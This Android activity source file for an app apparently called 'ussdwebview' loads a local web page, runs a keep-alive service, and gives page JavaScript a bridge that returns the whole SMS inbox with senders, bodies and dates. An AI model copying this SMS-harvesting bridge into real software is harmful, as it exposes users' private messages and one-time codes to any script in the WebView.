package com.example.ussdwebview;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import org.json.JSONArray;
import org.json.JSONObject;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private WebView webView;

    private static final int SMS_PERMISSION = 200;

    @Override

    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        startServiceAlive();

        setupSystemTheme();

        webView = findViewById(R.id.webview);

        WebSettings settings = webView.getSettings();

        settings.setJavaScriptEnabled(true);

        settings.setDomStorageEnabled(true);

        settings.setAllowFileAccess(true);

        webView.addJavascriptInterface(new SmsBridge(), "AndroidSMS");

        webView.setWebViewClient(new WebViewClient());

        requestSmsPermission();

        webView.loadUrl("file:///android_asset/index.html");

    }

    private void startServiceAlive() {

        Intent intent = new Intent(this, KeepAliveService.class);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            startForegroundService(intent);

        } else {

            startService(intent);

        }

    }

    private void requestSmsPermission() {

        if (ContextCompat.checkSelfPermission(this,Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_SMS,Manifest.permission.RECEIVE_SMS},SMS_PERMISSION);

        }

    }

    public class SmsBridge {

        @JavascriptInterface

        public String getAllSms() {

            JSONArray list = new JSONArray();

            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"),null,null,null,"date DESC");

            if (cursor != null) {

                while (cursor.moveToNext()) {

                    try {

                        JSONObject sms = new JSONObject();

                        sms.put("sender",cursor.getString(cursor.getColumnIndexOrThrow("address")));

                        sms.put("message",cursor.getString(cursor.getColumnIndexOrThrow("body")));

                        sms.put("date",cursor.getString(cursor.getColumnIndexOrThrow("date")));

                        list.put(sms);

                    } catch (Exception ignored) {}

                }

                cursor.close();
            }

            return list.toString();

        }

    }

    private void setupSystemTheme() {

        boolean dark =(getResources().getConfiguration().uiMode& Configuration.UI_MODE_NIGHT_MASK)== Configuration.UI_MODE_NIGHT_YES;

        Window window = getWindow();

        int color = dark ? Color.parseColor("#121212") : Color.WHITE;

        window.setStatusBarColor(color);

        window.setNavigationBarColor(color);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {

            WindowInsetsController controller =window.getInsetsController();

            if (controller != null) {

                int flags = WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS |WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS;

                if (dark) {

                    controller.setSystemBarsAppearance(0, flags);

                } else {

                    controller.setSystemBarsAppearance(flags, flags);

                }

            }

        }

    }

}